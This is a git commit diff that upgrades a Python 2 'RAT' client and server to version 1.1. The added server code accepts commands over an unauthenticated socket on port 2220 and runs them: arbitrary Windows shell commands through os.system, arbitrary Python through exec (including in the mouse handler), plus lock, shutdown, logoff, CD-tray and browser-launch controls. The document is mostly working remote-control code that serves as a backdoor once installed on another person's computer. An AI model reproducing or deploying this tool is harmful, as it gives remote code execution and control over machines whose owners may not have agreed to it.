102de0936a8adb23c3bd0f1b94e058aec12bc4f5
Matthew Taylor <matthewaptaylor@gmail.com>
2017-10-15 12:23:42 +0100

    Updated to version 1.1

--- client.py
+++ client.py
@@ -1,4 +1,5 @@
 # RAT Client by Matthew Taylor. Visit matthewaptaylor.github.io for more info.
+# Python RAT Client v1.1 by Matthew Taylor. See more at matthewaptaylor.github.io. This is licensed under the MIT license. This license requires credit to be given to the program's creator.
 
 print"""==========
 RAT Client
@@ -17,11 +18,25 @@ while True:
     command = raw_input("CLIENT > ")
     if command.lower() == "help":
         print """SERVER > Help for RAT Client v1.0:
+              stop                                 Closes the RAT on the other machine
+              exit                                 Closes the RAT on this machine
               send <message>                       Sends a message to the server
               logoff                               Logs off the computer
               shutdown                             Shuts down the computer
-              restart                              Restarts the computer"""
+              restart                              Restarts the computer
+              lock                                 Locks the computer
+              open site http://example.com/        Opens the site example.com in the default web browser
+              rom open                             Opens the CD/DVD-ROM drive
+              rom close                            Closes the CD/DVD-ROM drive
+              sound file                           Plays a sound file in the client's sound folder
+              mouse [10, 100]                      Positons the mouse at (10, 100)
+              cmd                                  Execute a windows command prompt command
+              python                               Execute a python command"""
     else:
+        if command[:4].lower() == "exit":
+            print "CLIENT > Exit commanded"
+            print "CLIENT > Exiting"
+            exit()
         s.sendall(command)
 
 s.close()
--- server.py
+++ server.py
@@ -1,6 +1,12 @@
 # RAT Server by Matthew Taylor. Visit matthewaptaylor.github.io for more info.
+# Python RAT Server v1.1 by Matthew Taylor. See more at matthewaptaylor.github.io. This is licensed under the MIT license. This license requires credit to be given to the program's creator.
+
 import socket
+import ctypes
 import subprocess
+import os
+import easygui
+import winsound
 
 print"""==========
 RAT Server
@@ -12,6 +18,7 @@ PORT = 2220 # Default port
 
 print "Connection info:"
 print "IP: " + socket.gethostbyname(socket.gethostname())
+print
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((HOST, PORT))
@@ -21,7 +28,12 @@ print "SERVER > Connection made: " + str(addr)
 while 1:
     command = conn.recv(1024)
     if not command: break
+    if command[:4].lower() == "stop":
+        print "CLIENT > Stop commanded"
+        print "SERVER > Stopping"
+        exit()
     if command[:4].lower() == "send":
+        easygui.msgbox(command[5:], title="Python RAT")
         print "CLIENT > Message: " + command[5:]
     elif command[:6].lower() == "logoff":
         print "CLIENT > Logoff commanded"
@@ -35,5 +47,38 @@ while 1:
         print "CLIENT > Restart commanded"
         print "SERVER > Restarting"
         subprocess.call(["shutdown", "/r"])
+    elif command[:4].lower() == "lock":
+        print "CLIENT > Lock commanded"
+        print "SERVER > Locking"
+        os.system("rundll32.exe user32.dll,LockWorkStation")
+    elif command[:9].lower() == "open site":
+        print "CLIENT > Website launch commanded"
+        print "SERVER > Opening " + command[10:] + " in default browser"
+        os.system('start "link" "' + command[10:] + '"')
+    elif command[:8].lower() == "rom open":
+        print "CLIENT > CD/DVD-ROM open commanded"
+        print "SERVER > Opening CD/DVD-ROM"
+        ctypes.windll.winmm.mciSendStringW(u"set cdaudio door open", None, 0, None)
+    elif command[:9].lower() == "rom close":
+        print "CLIENT > CD/DVD-ROM close commanded"
+        print "SERVER > Closing CD/DVD-ROM"
+        ctypes.windll.winmm.mciSendStringW(u"set cdaudio door closed", None, 0, None)
+    elif command[:10].lower() == "sound file":
+        print "CLIENT > Sound play commanded"
+        print "SERVER > Playing sound file " + command[11:]
+        winsound.PlaySound("sounds/" + command[11:], winsound.SND_ASYNC)
+    elif command[:5].lower() == "mouse":
+        exec("pos = " + command[6:])
+        print "CLIENT > Mouse move commanded"
+        print "SERVER > Moving mouse to (" + str(pos[0]) + ", " + str(pos[0]) + ")" 
+        ctypes.windll.user32.SetCursorPos(pos[0], pos[1])
+    elif command[:3].lower() == "cmd":
+        print "CLIENT > CMD command sent"
+        print "SERVER > Executing windows command " + command[4:]
+        os.system(command[4:])
+    elif command[:6].lower() == "python":
+        print "CLIENT > Python command sent"
+        print "SERVER > Executing python command " + command[7:]
+        exec(command[7:])
     conn.sendall(command)
 conn.close()
